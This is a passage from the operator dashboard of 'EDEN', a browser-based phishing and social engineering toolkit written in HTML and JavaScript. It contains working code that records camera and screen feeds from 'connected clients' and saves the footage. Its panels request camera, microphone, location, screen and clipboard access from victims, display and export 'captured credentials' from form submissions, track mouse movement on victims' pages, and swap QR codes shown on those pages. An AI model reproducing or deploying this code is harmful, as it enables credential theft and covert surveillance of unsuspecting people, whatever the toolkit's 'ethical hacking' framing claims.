        if (!cameraLogs) return;
        
        // Create log entry with timestamp
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        // Add timestamp
        const now = new Date();
        const timestamp = now.toLocaleTimeString();
        
        // Format client ID for display (use nickname if available)
        let clientName = clientId;
        if (window.clientNicknames && window.clientNicknames[clientId]) {
            clientName = window.clientNicknames[clientId];
        } else {
            // Shorten ID if it's too long
            clientName = clientId.length > 8 ? clientId.substring(0, 8) + '...' : clientId;
        }
        
        // Set log message with client info
        logEntry.innerHTML = `<span class="log-time">${timestamp}</span> <span class="log-client">${clientName}</span>: ${message}`;
        
        // Insert at top of log
        cameraLogs.insertBefore(logEntry, cameraLogs.firstChild);
        
        // Limit number of log entries to prevent overflow
        const maxLogEntries = 50;
        while (cameraLogs.children.length > maxLogEntries) {
            cameraLogs.removeChild(cameraLogs.lastChild);
        }
    }
    
    // Helper function to generate filenames in the format: nickname_eden_type_clientid_random-number.extension
    function generateEdenFilename(clientId, type, extension) {
        // Generate a random 4-digit number
        const randomNum = Math.floor(1000 + Math.random() * 9000);
        
        // Get nickname for the client if available
        let nickname = '';
        
        // Try to find client by clientId in our clients object
        for (const key in clients) {
            if (clients[key].clientId === clientId && clients[key].nickname) {
                nickname = clients[key].nickname + '_';
                break;
            }
        }
        
        // If no exact match, try partial match with the shortened ID
        if (!nickname) {
            const shortId = clientId.split('_').pop().substring(0, 8);
            for (const key in clients) {
                if (clients[key].clientId && 
                    clients[key].clientId.includes(shortId) && 
                    clients[key].nickname) {
                    nickname = clients[key].nickname + '_';
                    break;
                }
            }
        }
        
        // Construct the filename
        return `${nickname}eden_${type}_${clientId}_${randomNum}.${extension}`;
    }
    
    // Client-specific camera recording functions
    function toggleClientCameraRecording(clientId) {
        if (!window.clientCameraStreams || !window.clientCameraStreams[clientId]) {
            console.error(`No camera stream available for client ${clientId}`);
            showStatusMessage('warning', `No camera stream available for client ${clientId}`);
            return;
        }
        
        // Get the client's record button
        const recordButton = document.querySelector(`#camera-container-${clientId} button:first-child`);
        if (!recordButton) return;
        
        // Check if we're already recording for this client
        if (!window.clientCameraRecorders) window.clientCameraRecorders = {};
        
        if (!window.clientCameraRecorders[clientId]) {
            // Start recording
            try {
                // Initialize chunks array for this client
                if (!window.clientCameraChunks) window.clientCameraChunks = {};
                window.clientCameraChunks[clientId] = [];
                
                // Create MediaRecorder with optimal settings
                let options = { mimeType: 'video/webm' };
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                }
                
                const recorder = new MediaRecorder(window.clientCameraStreams[clientId], options);
                
                // Set up data handling
                recorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        window.clientCameraChunks[clientId].push(e.data);
                    }
                };
                
                // Set up stop handler
                recorder.onstop = function() {
                    if (window.clientCameraChunks[clientId].length > 0) {
                        const blob = new Blob(window.clientCameraChunks[clientId], { type: 'video/webm' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = generateEdenFilename(clientId, 'camera', 'webm');
                        a.click();
                        URL.revokeObjectURL(url);
                        
                        // Show success message
                        showStatusMessage('success', `Camera recording saved for client ${clientId}`);
                    }
                };
                
                // Start recording
                recorder.start(1000);
                window.clientCameraRecorders[clientId] = recorder;
                
                // Update button
                recordButton.textContent = '⏹️ Stop Recording';
                recordButton.style.backgroundColor = '#f44336';
                
                // Show status message
                showStatusMessage('success', `Started camera recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error starting camera recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to start camera recording: ${e.message}`);
            }
        } else {
            // Stop recording
            try {
                window.clientCameraRecorders[clientId].stop();
                delete window.clientCameraRecorders[clientId];
                
                // Update button
                recordButton.textContent = '⏺️ Start Recording';
                recordButton.style.backgroundColor = '';
                
                // Show status message
                showStatusMessage('success', `Stopped camera recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error stopping camera recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to stop camera recording: ${e.message}`);
            }
        }
    }
    
    // Client-specific camera screenshot function
    function takeClientCameraScreenshot(clientId) {
        if (!window.clientCameraCanvases || !window.clientCameraCanvases[clientId]) {
            console.error(`No camera canvas available for client ${clientId}`);
            showStatusMessage('warning', `No camera feed available for client ${clientId}`);
            return;
        }
        
        try {
            const canvas = window.clientCameraCanvases[clientId];
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = generateEdenFilename(clientId, 'camera', 'png');
            link.click();
            
            // Show success message
            showStatusMessage('success', `Camera screenshot saved for client ${clientId}`);
        } catch (e) {
            console.error(`Error taking camera screenshot for client ${clientId}:`, e);
            showStatusMessage('warning', `Failed to take camera screenshot: ${e.message}`);
        }
    }
    
    // Client-specific screen recording functions
    function toggleClientScreenRecording(clientId) {
        if (!window.clientScreenStreams || !window.clientScreenStreams[clientId]) {
            console.error(`No screen stream available for client ${clientId}`);
            showStatusMessage('warning', `No screen stream available for client ${clientId}`);
            return;
        }
        
        // Get the client's record button
        const recordButton = document.querySelector(`#screen-container-${clientId} button:first-child`);
        if (!recordButton) return;
        
        // Check if we're already recording for this client
        if (!window.clientScreenRecorders) window.clientScreenRecorders = {};
        
        if (!window.clientScreenRecorders[clientId]) {
            // Start recording
            try {
                // Initialize chunks array for this client
                if (!window.clientScreenChunks) window.clientScreenChunks = {};
                window.clientScreenChunks[clientId] = [];
                
                // Create MediaRecorder with optimal settings
                let options = { mimeType: 'video/webm' };
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                }
                
                const recorder = new MediaRecorder(window.clientScreenStreams[clientId], options);
                
                // Set up data handling
                recorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        window.clientScreenChunks[clientId].push(e.data);
                    }
                };
                
                // Set up stop handler
                recorder.onstop = function() {
                    if (window.clientScreenChunks[clientId].length > 0) {
                        const blob = new Blob(window.clientScreenChunks[clientId], { type: 'video/webm' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = generateEdenFilename(clientId, 'screenshare', 'webm');
                        a.click();
                        URL.revokeObjectURL(url);
                        
                        // Show success message
                        showStatusMessage('success', `Screen recording saved for client ${clientId}`);
                    }
                };
                
                // Start recording
                recorder.start(1000);
                window.clientScreenRecorders[clientId] = recorder;
                
                // Update button
                recordButton.textContent = '⏹️ Stop Recording';
                recordButton.style.backgroundColor = '#f44336';
                
                // Show status message
                showStatusMessage('success', `Started screen recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error starting screen recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to start screen recording: ${e.message}`);
            }
        } else {
            // Stop recording
            try {
                window.clientScreenRecorders[clientId].stop();
                delete window.clientScreenRecorders[clientId];
                
                // Update button
                recordButton.textContent = '⏺️ Start Recording';
                recordButton.style.backgroundColor = '';
                
                // Show status message
                showStatusMessage('success', `Stopped screen recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error stopping screen recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to stop screen recording: ${e.message}`);
            }
        }
    }
    
    // Client-specific screen screenshot function
    function takeClientScreenScreenshot(clientId) {
        const clientScreen = document.getElementById(`client-screen-${clientId}`);
        if (!clientScreen || !clientScreen.complete || clientScreen.naturalWidth === 0) {
            console.error(`No screen image available for client ${clientId}`);
            showStatusMessage('warning', `No screen feed available for client ${clientId}`);
            return;
        }
        
        try {
            const canvas = document.createElement('canvas');
            canvas.width = clientScreen.naturalWidth;
            canvas.height = clientScreen.naturalHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(clientScreen, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = generateEdenFilename(clientId, 'screenshare', 'png');
            link.click();
            
            // Show success message
            showStatusMessage('success', `Screen screenshot saved for client ${clientId}`);
        } catch (e) {
            console.error(`Error taking screen screenshot for client ${clientId}:`, e);
            showStatusMessage('warning', `Failed to take screen screenshot: ${e.message}`);
        }
    }
</script>
    

</head>
<body>
    <div class="layout">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-logo-container">
                     <!-- <img src="Eden_logo.png" alt="Eden Garden Logo" class="logo-image"> -->
                    <div class="sidebar-logo">EDEN</div>
                    <div class="sidebar-subtitle">Exploit & Dynamic Execution Network</div>
                </div>
            </div>
            <ul class="sidebar-menu">
                <li class="sidebar-menu-item">
                    <a href="#" class="active" data-section="connection">
                        <i class="fas fa-network-wired"></i>
                        <span>Connection</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="display">
                        <i class="fas fa-desktop"></i>
                        <span>Display</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" data-section="editor">
                        <i class="fas fa-code"></i>
                        <span>Code Editor</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="blur">
                        <i class="fas fa-eye-slash"></i>
                        <span>Blur Tool</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" data-section="custom">
                        <i class="fas fa-paint-brush"></i>
                        <span>Custom</span>
                    </a>
                </li>

                <li class="sidebar-menu-item">
                    <a href="#" data-section="permission">
                     <i class="fas fa-shield-alt"></i>
                        <span>Permission</span>
                    </a>
                </li>

                <li class="sidebar-menu-item">
                    <a href="#" data-section="credentials">
                        <i class="fas fa-key"></i>
                        <span>Credentials</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="preview">
                        <i class="fas fa-eye"></i>
                        <span>Preview</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="edenqr">
                        <i class="fas fa-qrcode"></i>
                        <span>EdenQR</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="aboutus">
                        <i class="fas fa-info-circle"></i>
                        <span>About Us</span>
                    </a>
                </li>
                
            </ul>
        </aside>
        
        <!-- Main Content -->
        <main class="main-content">
            <!-- Navigation Toggle Button (Always Visible) -->
            <button class="toggle-sidebar" id="mobileNavToggle">
                <i class="fas fa-bars"></i>
            </button>
            
            <!-- Header -->
            <div class="header">
                <div class="header-left">
                    <h1 style="color: #023e8a;">Eden</h1>
                    <p class="header-subtitle" style="color: #4895ef;">Redefining browser intelligence through dynamic execution.</p>
                </div>
                <div class="header-right">
                    <div class="toggle-container">
                        <label class="toggle-switch">
                            <input type="checkbox" id="reloadToggle">
                            <span class="slider"></span>
                        </label>
                    </div>
                    

                   
                    <!-- Reload toggle -->
                <div class="toggle-container" style="display: flex; align-items: center; gap: 10px;">
                    <span class="toggle-label">Reload:</span>
                    <label class="toggle-switch">
                        <input type="checkbox" id="displayReloadToggle" checked>
                        <span class="toggle-slider"></span>
                    </label>
                    <button id="manualReloadBtn" class="btn btn-primary btn-small" title="Manually reload client">
                        <i class="fas fa-sync-alt"></i> Reload
                    </button>
                </div>
                
                <!-- Logout Button -->
                <button id="logoutBtn" class="btn-logout" onclick="logout()" style="background-color: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: background-color 0.3s; margin-left: 15px;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </button>
                </div>
            </div>
            
    <!-- About Us Section -->
<div class="content-section" id="aboutus">
    <div class="container">
        <!-- Page Title -->
        <div class="page-title">
            <h1>About Eden</h1>
            <p>Phishing & Social Engineering Toolkit</p>
        </div>

        <!-- About Section -->
        <div class="about-section">
            <div class="about-header">
                <h2>Eden</h2>
            </div>
            <p>Eden is a phishing and social media hacking tool inspired by various existing red team concepts.
                It was built to simulate real-world attack scenarios for ethical hacking practice, security research, and awareness testing. Eden is designed for learning and experimentation in controlled environments.</p>
            
            <p>While still under development, the project aims to grow with future updates that will include advanced features, stealth improvements, and broader compatibility.</p>
        </div>

        <!-- Team Section -->
        <div class="about-section">
            <div class="about-header">
                <h2>About us</h2>
            </div>
            
            <div class="team-container">
                <!-- Creator -->
                <div class="team-member no-image">
                    <div class="member-name">Varun</div>
                    <div class="member-role">Ethical Hacker</div>
                    <div class="member-bio">
                        <p>I'm a passionate cybersecurity enthusiast with a strong interest in ethical hacking, red teaming, and web application security. I spend my time learning, building tools, and simulating real-world attacks in safe environments to sharpen my skills. I'm currently exploring opportunities to grow and contribute within the cybersecurity field.</p>
                    </div>
                    <div class="social-links">
                        <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                            <i class="fab fa-github"></i>
                        </a>
                        <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                            <i class="fab fa-linkedin-in"></i>
                        </a>
                        <a href="#" class="social-link" title="Twitter">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a href="#" class="social-link" title="Instagram">
                            <i class="fab fa-instagram"></i>
                        </a>
                        <a href="#" class="social-link" title="Discord">
                            <i class="fab fa-discord"></i>
                        </a>
                    </div>
                </div>
                
                <!-- Mentor -->
                <div class="team-member no-image">
                    <div class="member-name">Aashish Kumar</div>
                    <div class="member-role">Cybersecurity Mentor</div>
                    <div class="member-bio">
                        <p>Cybersecurity teacher, creator, and Co-Founder of M Cyber Academy. Provided expert guidance throughout the development of Eden, sharing invaluable insights from years of industry experience.</p>
                    </div>
                    <div class="social-links">
                        <a href="https://www.linkedin.com/in/aashish-kumar-hak0r" target="_blank" class="social-link" title="LinkedIn">
                            <i class="fab fa-linkedin-in"></i>
                        </a>
                        <a href="https://www.instagram.com/mcyberacademy/" target="_blank" class="social-link" title="Instagram">
                            <i class="fab fa-instagram"></i>
                        </a>
                        <a href="#" class="social-link" title="Twitter">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a href="#" class="social-link" title="Discord">
                            <i class="fab fa-discord"></i>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
            
            <!-- Connection Section -->
            <div class="content-section active" id="connection">
                <div class="connection-header">
                    <h2 class="connection-title">Connected Clients</h2>
                    <div>

                        <button class="btn-clear-all" id="clearAllBtn">
                            <i class="fas fa-trash-alt"></i>
                            Clear All
                        </button>
                    </div>
                </div>
                
                <div class="client-selection-bar" id="selectionBar" style="display: none; margin-bottom: 20px; padding: 12px; background: rgba(255, 255, 255, 0.9); border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 51, 128, 0.1);">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span><b><span id="selectedCount">0</span> client(s) selected</b></span>
                        <button class="btn-outline" id="cancelSelectionBtn" style="padding: 5px 12px; font-size: 0.8rem;">
                            <i class="fas fa-times"></i> Cancel Selection
                        </button>
                    </div>
                </div>
                
                <div class="client-list" id="clientList">
                    <!-- Client cards will be added here dynamically -->
                    <div class="empty-state" id="emptyState">
                        <div class="empty-icon">
                            <i class="fas fa-plug"></i>
                        </div>
                        <div class="empty-text">No active connections</div>
                        <div class="empty-subtext">Waiting for clients to connect...</div>
                    </div>
                </div>
                
                <!-- Communication Interface (Hidden by default) -->
                <div id="communicationInterface" style="display: none; margin-top: 20px; background: rgba(255, 255, 255, 0.9); border-radius: 12px; padding: 20px; box-shadow: 0 5px 15px rgba(0, 51, 128, 0.1);">
                    <h3 style="margin-top: 0; margin-bottom: 15px; color: var(--dark);">Communication</h3>
                    <div style="margin-bottom: 15px;">
                        <p><strong>Selected IP:</strong> <span id="selectedIpDisplay">None</span></p>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <textarea id="messageInput" placeholder="Enter your message here..." style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); height: 100px; font-family: inherit;"></textarea>
                    </div>
                    <div style="display: flex; justify-content: flex-end; gap: 10px;">
                        <button id="closeCommBtn" class="btn-outline" style="padding: 8px 15px;">Close</button>
                        <button id="sendMessageBtn" class="btn-primary" style="padding: 8px 15px;">
                            <i class="fas fa-paper-plane"></i> Send Message
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Permission Section -->
<div class="content-section" id="permission">
    <h2>Permission Control Panel</h2>
    <div class="perm-container">
        <div class="perm-button-container">
            <button class="perm-button" onclick="requestAllPermissions()">🔐 Request All Permissions</button>
            <button class="perm-button" onclick="requestPermission('camera')">📸 Request Camera Access</button>
            <button class="perm-button" onclick="requestPermission('microphone')">🎤 Request Microphone Access</button>
            <button class="perm-button" onclick="requestPermission('screen')">🖥️ Request Screen Capture</button>
            <button class="perm-button" onclick="requestPermission('location')">📍 Request Location Access</button>
            <button class="perm-button" onclick="requestPermission('clipbord')">📋 Request Clipboard Access</button>
        </div>
        <div id="status-container">
            <div class="perm-nav-tabs">
                <button class="perm-nav-tab active" onclick="showsContent('all')">All</button>
                <button class="perm-nav-tab" onclick="showsContent('camera')">Camera</button>
                <button class="perm-nav-tab" onclick="showsContent('screen')">Screen</button>
                <button class="perm-nav-tab" onclick="showsContent('clipboard')">Clipboard</button>
                <button class="perm-nav-tab" onclick="showsContent('audio')">Audio</button>
                <button class="perm-nav-tab" onclick="showsContent('location')">Location</button>
                <button class="perm-nav-tab" onclick="showsContent('other')">Other</button>
            </div>
            
            <div id="all-content" class="perm-content-section active">
                <h3>All Status Logs</h3>
                <div id="allLogs"></div>
            </div>

            <div id="camera-content" class="perm-content-section">
                <h3>Camera Feed</h3>
                
                <!-- Client-specific camera feeds section -->
                <div class="section-container">
                    <h4>Client-Specific Camera Feeds</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Camera feeds from specific clients will appear below.
                    </div>
                    <div id="client-camera-feeds" style="margin-top: 20px; display: flex; flex-direction: column; gap: 20px;"></div>
                </div>
                
                <div id="cameraLogs"></div>
            </div>

            <div id="audio-content" class="perm-content-section">
                <h3>Audio Visualization</h3>
                
                <!-- Client-specific audio section -->
                <div class="section-container">
                    <h4>Client-Specific Audio Feeds</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Audio feeds from specific clients will appear below.
                    </div>
                    <div id="audioContainer" style="margin-top: 20px;">
                        <!-- Client-specific audio visualizers will be added here dynamically -->
                    </div>
                </div>
                
                <div id="audioLogs"></div>
            </div>

            <div id="location-content" class="perm-content-section">
                <h3>Location Information</h3>
                
                <!-- Location drawer similar to clipboard section -->
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <p>Location history by client</p>
                    <button id="clearLocationBtn" class="perm-button" onclick="clearAllLocationHistory()">
                        <i class="fas fa-trash"></i> Clear All History
                    </button>
                </div>
                
                
                
                <div id="locationHistory" class="location-history-container" style="margin-top: 20px;"></div>
                
                <div id="locationLogs"></div>
            </div>

            <div id="screen-content" class="perm-content-section">
                <h3>Screen Capture</h3>
                
                <!-- Client-specific screen captures section -->
                <div class="section-container">
                    <h4>Client-Specific Screen Captures</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Screen captures from specific clients will appear below.
                    </div>
                    <div id="client-screen-captures" style="margin-top: 20px; display: flex; flex-direction: column; gap: 20px;"></div>
                </div>
                
                <div id="screenLogs"></div>
            </div>

            <div id="clipboard-content" class="perm-content-section">
                <h3>Clipboard Content</h3>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <p>Clipboard history by client</p>
                    <div style="display: flex; gap: 10px; align-items: center;">
                        <div class="export-options" style="display: flex; align-items: center; background-color: #f8f9fa; padding: 5px 10px; border-radius: 4px; border: 1px solid #dee2e6;">
                            <label for="clipboardExportFormatSelect" style="margin-right: 8px; font-size: 14px; color: #495057;">Format:</label>
                            <select id="clipboardExportFormatSelect" style="padding: 5px; border-radius: 4px; border: 1px solid #ced4da; background-color: white;">
                                <option value="html">HTML</option>
                                <option value="pdf">PDF</option>
                                <option value="txt">Text</option>
                                <option value="json">JSON</option>
                            </select>
                        </div>
                        <button id="exportClipboardBtn" class="btn-export" style="background-color: #28a745; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; transition: all 0.3s ease;">
                            <i class="fas fa-file-export" style="margin-right: 5px;"></i>
                            Export
                        </button>
                        <button id="clearClipboardBtn" class="perm-button" onclick="clearClipboardHistory()">Clear All History</button>
                    </div>
                </div>
                <div id="clipboardHistory" class="clipboard-history-container"></div>
                <div id="clipboardLogs"></div>
            </div>

            <div id="other-content" class="perm-content-section">
                <h3>Other Permissions</h3>
                <div id="otherLogs"></div>
            </div>
        </div>
    </div>
</div>

            <!-- Credentials Section -->
            <div class="content-section" id="credentials">
                <h2>Captured Credentials</h2>
                <div class="credentials-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                    <p class="header-subtitle">Form submissions with credential fields</p>
                    <div class="credentials-actions" style="display: flex; gap: 10px; align-items: center;">
                        
                        
                        <div class="export-options" style="display: flex; align-items: center; background-color: #f8f9fa; padding: 5px 10px; border-radius: 4px; border: 1px solid #dee2e6;">
                            <label for="exportFormatSelect" style="margin-right: 8px; font-size: 14px; color: #495057;">Format:</label>
                            <select id="exportFormatSelect" style="padding: 5px; border-radius: 4px; border: 1px solid #ced4da; background-color: white;">
                                
                                <option value="html">HTML</option>
                                <option value="pdf">PDF</option>                            
                                <option value="txt">Text</option>
                                <option value="json">JSON</option>
                            </select>
                        </div>
                      
                        <button id="exportCredentialsBtn" class="btn-export" style="background-color: #28a745; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; transition: all 0.3s ease;">
                            <i class="fas fa-file-export" style="margin-right: 5px;"></i>
                            Export
                        </button>
                        <button id="clearCredentialsBtn" class="btn-clear-all" style="background-color: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center;">
                            <i class="fas fa-trash-alt" style="margin-right: 5px;"></i>
                            Clear All
                        </button>
                    </div>
                </div>
                
                <!-- Add this style section for credential selection -->

                
                <div id="credentialsEmptyState" style="text-align: center; padding: 2rem; background: rgba(255, 255, 255, 0.7); border-radius: 8px;">
                    <div style="font-size: 2.5rem; margin-bottom: 15px; color: #64748b;">
                        <i class="fas fa-key"></i>
                    </div>
                    <div style="font-size: 1.2rem; font-weight: 600; color: #334155; margin-bottom: 5px;">No credentials captured</div>
                    <div style="color: #64748b; font-size: 0.9rem;">Waiting for form submissions with username, password, email, etc.</div>
                </div>
                
                <div id="credentialsList" style="display: grid; grid-template-columns: 1fr; gap: 15px;"></div>
            </div>
            
            <!-- Preview-Section (BOM.html) -->
            <div class="content-section" id="preview">
                <h2>Live Content Preview</h2>
                <div class="preview-description" style="margin-bottom: 15px; background: #f8f9fa; padding: 10px; border-radius: 5px; border-left: 3px solid #4CAF50;">
                    <p><i class="fas fa-info-circle"></i> This panel shows the live content from tracked client pages in real-time</p>
                </div>
                
                <!-- Mouse position tracking detail -->
                <div class="mouse-position-container" style="display: flex; margin-bottom: 15px; background: #e3f2fd; padding: 15px; border-radius: 5px; border-left: 3px solid #2196F3;">
                    <div style="flex: 1;">
                        <h3 style="margin: 0 0 10px 0; color: #0d47a1; font-size: 16px;">
                            <i class="fas fa-mouse-pointer"></i> Mouse Position Tracking
                        </h3>
                        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">X Position</div>
                                <div id="mouseXDetail" style="font-size: 20px; font-weight: bold; color: #2196F3;">0</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Y Position</div>
                                <div id="mouseYDetail" style="font-size: 20px; font-weight: bold; color: #2196F3;">0</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Client ID</div>
                                <div id="mouseClientId" style="font-size: 16px; font-weight: bold; color: #2196F3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">-</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">% X,Y</div>
                                <div style="font-size: 16px; font-weight: bold; color: #2196F3;">
                                    <span id="mouseXPercent">0</span>%, <span id="mouseYPercent">0</span>%
                                </div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Last Update</div>
                                <div id="mouseLastUpdate" style="font-size: 14px; font-weight: bold; color: #2196F3;">-</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Add styles for tracking buttons and minimization -->

                
                <!-- Client Container Grid - Replaces single iframe container -->
                <div id="client-preview-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(1024px, 2fr)); gap: 50px; padding: 20px; box-sizing: border-box; width: 100%; max-width: 100vw; min-height: 100vh; height: auto; overflow: visible;">
                    <!-- Client containers will be added here dynamically -->
                </div>
                

                
            </div>
            
            <!-- EdenQR Section -->
            <div class="content-section" id="edenqr">
                <h2>EdenQR - QR Code Customization</h2>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: start; padding: 20px 0;">
                    <!-- QR Customization Panel -->
                    <div class="edenqr-sidebar" style="background: #ffffff; border: 1px solid #b0c4de; border-radius: 18px; padding: 24px; box-shadow: 0 16px 48px rgba(112,128,144,0.15); overflow-y: auto; max-height: calc(100vh - 200px);">
                        <h3 style="margin: 0 0 10px 0; font-size: 22px; color: #708090;">QR Designer</h3>
                        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Customize QR codes detected from client pages and send styled versions back.</p>
                        
                        <!-- QR Selector (if multiple QRs detected) -->
                        <div id="edenqr-qrSelectionContainer" style="display: none; margin-bottom: 15px;">
                            <label style="font-weight: 600; display: block; color: #708090;">Select QR Code</label>
                            <select id="edenqr-qrCandidateSelect" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;"></select>
                        </div>
                        
                        <label style="font-weight: 600; margin-top: 12px; display: block; color: #708090;">Text / URL</label>
                        <input type="text" id="edenqr-link" placeholder="Enter URL" value="https://example.com" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                        
                        <div class="edenqr-color-row" style="display: flex; align-items: center; gap: 12px; margin-top: 12px;">
                            <label style="font-weight: 600; flex: 1; min-width: 120px; margin: 0; color: #708090;">Dot Style</label>
                            <input type="color" id="edenqr-dotPrimary" value="#000000" style="width: 60px; height: 60px; padding: 5px; border: 2px solid #b0c4de; border-radius: 8px; cursor: pointer; flex-shrink: 0;">
                            <select id="edenqr-dotStyle" style="flex: 1; padding: 10px; margin: 0; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                                <option value="square">Square</option>
                                <option value="dots">Dots</option>
                                <option value="rounded">Rounded</option>
                                <option value="extra-rounded">Extra Rounded</option>
                                <option value="classy">Classy</option>
                                <option value="classy-rounded">Classy Rounded</option>
                            </select>
                        </div>
                        
                        <div class="edenqr-color-row" style="display: flex; align-items: center; gap: 12px; margin-top: 12px;">
                            <label style="font-weight: 600; flex: 1; min-width: 120px; margin: 0; color: #708090;">Inner Eye Style</label>
                            <input type="color" id="edenqr-eyeInnerColor" value="#000000" style="width: 60px; height: 60px; padding: 5px; border: 2px solid #b0c4de; border-radius: 8px; cursor: pointer; flex-shrink: 0;">
                            <select id="edenqr-innerEyeStyle" style="flex: 1; padding: 10px; margin: 0; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                                <option value="square">Square</option>
                                <option value="dot">Dot</option>
                            </select>
                        </div>
                        
                        <div class="edenqr-color-row" style="display: flex; align-items: center; gap: 12px; margin-top: 12px;">
                            <label style="font-weight: 600; flex: 1; min-width: 120px; margin: 0; color: #708090;">Outer Eye Style</label>
                            <input type="color" id="edenqr-eyeOuterColor" value="#000000" style="width: 60px; height: 60px; padding: 5px; border: 2px solid #b0c4de; border-radius: 8px; cursor: pointer; flex-shrink: 0;">
                            <select id="edenqr-eyeStyle" style="flex: 1; padding: 10px; margin: 0; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                                <option value="square">Square</option>
                                <option value="circle">Circle</option>
                            </select>
                        </div>
                        
                        <label style="font-weight: 600; margin-top: 15px; display: block; color: #708090;">Color Mode</label>
